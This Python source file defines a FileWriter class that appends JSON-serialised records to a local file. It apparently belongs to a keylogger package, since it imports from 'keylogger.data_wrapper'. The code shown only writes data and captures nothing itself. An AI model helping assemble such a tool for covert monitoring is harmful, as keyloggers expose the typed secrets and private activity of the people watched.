import json

from keylogger.data_wrapper import DataWrapper


class FileWriter:
    def __init__(self, path):
        self.file_path = path

    def sink(self, data_wrapper: DataWrapper):
        self.write_to_file(data_wrapper)

    def write_to_file(self, data_wrapper: DataWrapper):
        formatted_data = json.dumps(data_wrapper.format_as_dict(), ensure_ascii=False)
        try:
            with open(self.file_path, "a") as file:
                file.write(formatted_data + "\n")
        except FileNotFoundError:
            with open(self.file_path, "w") as file:
                file.write(formatted_data + "\n")
        except Exception as e:
            print(f"An error occurred: {e}")
